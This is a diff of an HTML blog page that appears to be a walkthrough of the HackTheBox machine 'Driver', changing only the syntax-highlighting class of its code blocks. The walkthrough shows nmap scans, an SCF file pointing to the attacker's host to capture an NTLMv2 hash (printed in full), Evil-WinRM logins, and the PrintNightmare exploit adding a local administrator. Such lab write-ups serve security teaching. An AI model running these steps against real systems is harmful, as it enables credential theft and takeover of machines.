@@ -243,7 +243,7 @@ into the {body} of the default.hbs template -->
 
 <p>I deployed the machine and was given the target IP 10.10.11.106. I started a NMAP scan to check the available ports.</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="nv">$sudo</span> nmap -sC -sV -oA nmap/initial 10.10.11.106
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="nv">$sudo</span> nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> nmap/initial 10.10.11.106
 Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-02-27 17:20 GMT
 Nmap scan report <span class="k">for </span>10.10.11.106
 Host is up <span class="o">(</span>0.020s latency<span class="o">)</span><span class="nb">.</span>
@@ -251,7 +251,7 @@ Not shown: 997 filtered ports
 PORT    STATE SERVICE      VERSION
 80/tcp  open  http         Microsoft IIS httpd 10.0
 | http-auth: 
-| HTTP/1.1 401 Unauthorized\x0D
+| HTTP/1.1 401 Unauthorized<span class="se">\x</span>0D
 |_  Basic <span class="nv">realm</span><span class="o">=</span>MFP Firmware Update Center. Please enter password <span class="k">for </span>admin
 | http-methods: 
 |_  Potentially risky methods: TRACE
@@ -289,7 +289,7 @@ Nmap done: 1 IP address (1 host up) scanned in 51.89 seconds
 
 <p>I also ran a full port scan and found winrm to be open on port 5985.</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="nv">$sudo</span> nmap -p- -oA nmap/all_ports 10.10.11.106
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="nv">$sudo</span> nmap <span class="nt">-p-</span> <span class="nt">-oA</span> nmap/all_ports 10.10.11.106
 Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-02-27 17:25 GMT
 Nmap scan report <span class="k">for </span>10.10.11.106
 Host is up <span class="o">(</span>0.026s latency<span class="o">)</span><span class="nb">.</span>
@@ -307,10 +307,10 @@ PORT     STATE SERVICE
 
 <p>Before looking at the web service I tried enumerating SMB with various tools such as smbmap, smbclient and CrackMapExec however I had no joy.</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="nv">$cme</span> smb 10.10.11.106
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="nv">$cme</span> smb 10.10.11.106
 SMB         10.10.11.106    445    DRIVER           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 Enterprise 10240 x64 <span class="o">(</span>name:DRIVER<span class="o">)</span> <span class="o">(</span>domain:DRIVER<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
 ┌─[daz@parrotos]─[~/Documents/HackTheBox/Driver]
-└──╼ <span class="nv">$smbmap</span> -H 10.10.11.106
+└──╼ <span class="nv">$smbmap</span> <span class="nt">-H</span> 10.10.11.106
 <span class="o">[!]</span> Authentication error on 10.10.11.106
 </code></pre></div></div>
 
@@ -338,10 +338,10 @@ SMB         10.10.11.106    445    DRIVER           <span class="o">[</span><spa
 
 <p>The first article that returned was from Penetration testing lab https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/. After reading the article I created the file test.scf using the example they provide and changed the IP to my VPN IP.</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="nv">$cat</span> test.scf 
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="nv">$cat</span> test.scf 
 <span class="o">[</span>Shell]
 <span class="nv">Command</span><span class="o">=</span>2
-<span class="nv">IconFile</span><span class="o">=</span>\\10.10.14.11\share\pentestlab.ico
+<span class="nv">IconFile</span><span class="o">=</span><span class="se">\\</span>10.10.14.11<span class="se">\s</span>hare<span class="se">\p</span>entestlab.ico
 <span class="o">[</span>Taskbar]
 <span class="nv">Command</span><span class="o">=</span>ToggleDesktop
 </code></pre></div></div>
@@ -350,8 +350,8 @@ SMB         10.10.11.106    445    DRIVER           <span class="o">[</span><spa
 
 <p>Then uploaded the file using the web upload function and got a hit from responder</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>SMB] NTLMv2-SSP Client   : 10.10.11.106
-<span class="o">[</span>SMB] NTLMv2-SSP Username : DRIVER\tony
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>SMB] NTLMv2-SSP Client   : 10.10.11.106
+<span class="o">[</span>SMB] NTLMv2-SSP Username : DRIVER<span class="se">\t</span>ony
 <span class="o">[</span>SMB] NTLMv2-SSP Hash     : tony::DRIVER:87ea6d299d14fa32:ED6355EFB0444E974805B3FF0E0B9B26:0101000000000000803021AB042CD801AE67B0D5B0D050060000000002000800350054003400480001001E00570049004E002D0
 0350032003700430037004C004F004F0030004300360004003400570049004E002D00350032003700430037004C004F004F003000430036002E0035005400340048002E004C004F00430041004C000300140035005400340048002E004C004F004
 30041004C000500140035005400340048002E004C004F00430041004C0007000800803021AB042CD80106000400020000000800300030000000000000000000000000200000C974CDC12A32C5BFD81B375A1DECF3BF2FF300E27CB3440A6AC953C
@@ -362,26 +362,26 @@ SMB         10.10.11.106    445    DRIVER           <span class="o">[</span><spa
 
 <p>Now I had a username and password I was able to use winrm to login. To login I used <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a>.</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="nv">$/</span>opt/evil-winrm/evil-winrm.rb -u tony -i 10.10.11.106
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="nv">$/</span>opt/evil-winrm/evil-winrm.rb <span class="nt">-u</span> tony <span class="nt">-i</span> 10.10.11.106
 Enter Password: 
 
 Evil-WinRM shell v2.4
 
 Info: Establishing connection to remote endpoint
 
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> <span class="nb">PS </span>C:\Users\tony\Documents&gt; 
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; 
 </code></pre></div></div>
 
 <h3 id="priv-esc">Priv Esc</h3>
 
 <p>Now I had a foothold, I did some basic enumeration of the box. Looking at the running services I could see the Windows print spooler service.</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    381      23     5164      14448 ...12            1128 spoolsv
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    381      23     5164      14448 ...12            1128 spoolsv
 </code></pre></div></div>
 
 <p>This made me think of the PrintNightmare exploit. I could also have used rpcdump to find this.</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="nv">$rpcdump</span>.py 10.10.11.106 | egrep <span class="s1">'MS-RPRN|MS-PAR'</span>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="nv">$rpcdump</span>.py 10.10.11.106 | egrep <span class="s1">'MS-RPRN|MS-PAR'</span>
 Protocol: <span class="o">[</span>MS-PAR]: Print System Asynchronous Remote Protocol
 Protocol: <span class="o">[</span>MS-RPRN]: Print System Remote Protocol 
 </code></pre></div></div>
@@ -390,7 +390,7 @@ Protocol: <span class="o">[</span>MS-RPRN]: Print System Remote Protocol
 
 <p>I used git to clone the repo in to my /opt directory.</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="nv">$sudo</span> git clone https://github.com/calebstewart/CVE-2021-1675.git
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="nv">$sudo</span> git clone https://github.com/calebstewart/CVE-2021-1675.git
 Cloning into <span class="s1">'CVE-2021-1675'</span>...
 remote: Enumerating objects: 40, <span class="k">done</span><span class="nb">.</span>
 remote: Counting objects: 100% <span class="o">(</span>40/40<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
@@ -407,51 +407,51 @@ CVE-2021-1675.ps1  nightmare-dll  README.md
 
 <p>Now using Evil-WinRM I can upload the powershell script and execute it.</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> <span class="nb">PS </span>C:\Users\tony\Documents&gt; upload /opt/CVE-2021-1675/CVE-2021-1675.ps1
-Info: Uploading /opt/CVE-2021-1675/CVE-2021-1675.ps1 to C:\Users\tony\Documents\CVE-2021-1675.ps1
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; upload /opt/CVE-2021-1675/CVE-2021-1675.ps1
+Info: Uploading /opt/CVE-2021-1675/CVE-2021-1675.ps1 to C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments<span class="se">\C</span>VE-2021-1675.ps1
 
                                                              
-<span class="k">Data</span>: 238080 bytes of 238080 bytes copied
+Data: 238080 bytes of 238080 bytes copied
 
 Info: Upload successful!
 
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> <span class="nb">PS </span>C:\Users\tony\Documents&gt; Import-Module C:\Users\tony\Documents\CVE-2021-1675.ps1
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> <span class="nb">PS </span>C:\Users\tony\Documents&gt; Invoke-Nightmare
-<span class="o">[</span>+] <span class="k">using </span>default new user: adm1n
-<span class="o">[</span>+] <span class="k">using </span>default new password: P@ssw0rd
-<span class="o">[</span>+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
-<span class="o">[</span>+] <span class="k">using </span>pDriverPath <span class="o">=</span> <span class="s2">"C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"</span>
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; Import-Module C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments<span class="se">\C</span>VE-2021-1675.ps1
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; Invoke-Nightmare
+<span class="o">[</span>+] using default new user: adm1n
+<span class="o">[</span>+] using default new password: P@ssw0rd
+<span class="o">[</span>+] created payload at C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\n</span>ightmare.dll
+<span class="o">[</span>+] using pDriverPath <span class="o">=</span> <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\S</span><span class="s2">ystem32</span><span class="se">\D</span><span class="s2">riverStore</span><span class="se">\F</span><span class="s2">ileRepository</span><span class="se">\n</span><span class="s2">tprint.inf_amd64_f66d9eed7e835e97</span><span class="se">\A</span><span class="s2">md64</span><span class="se">\m</span><span class="s2">xdwdrv.dll"</span>
 <span class="o">[</span>+] added user  as <span class="nb">local </span>administrator
-<span class="o">[</span>+] deleting payload <span class="k">from </span>C:\Users\tony\AppData\Local\Temp\nightmare.dll
+<span class="o">[</span>+] deleting payload from C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\n</span>ightmare.dll
 </code></pre></div></div>
 
 <p>It worked! I canceled my current WinRM session and logged back in using the new credentials.</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> <span class="nb">PS </span>C:\Users\tony\Documents&gt; <span class="k">exit
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; <span class="nb">exit
 
 </span>Info: Exiting with code 0
 
 ┌─[daz@parrotos]─[~/Documents/HackTheBox/Driver]
-└──╼ <span class="nv">$/</span>opt/evil-winrm/evil-winrm.rb -u adm1n -i 10.10.11.106
+└──╼ <span class="nv">$/</span>opt/evil-winrm/evil-winrm.rb <span class="nt">-u</span> adm1n <span class="nt">-i</span> 10.10.11.106
 Enter Password: 
 
 Evil-WinRM shell v2.4
 
 Info: Establishing connection to remote endpoint
 
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> <span class="nb">PS </span>C:\Users\adm1n\Documents&gt; <span class="nb">cd </span>C:/Users/Administrator/Desktop
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> <span class="nb">PS </span>C:\Users\Administrator\Desktop&gt; <span class="nb">dir
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>dm1n<span class="se">\D</span>ocuments&gt; <span class="nb">cd </span>C:/Users/Administrator/Desktop
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; dir
 
 
-    </span>Directory: C:\Users\Administrator\Desktop
+    Directory: C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
 
 
 Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--ar---        2/26/2022   8:56 PM             34 root.txt
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-ar---</span>        2/26/2022   8:56 PM             34 root.txt
 
 
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> <span class="nb">PS </span>C:\Users\Administrator\Desktop&gt; <span class="nb">type </span>root.txt
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type </span>root.txt
 
 </code></pre></div></div>
 
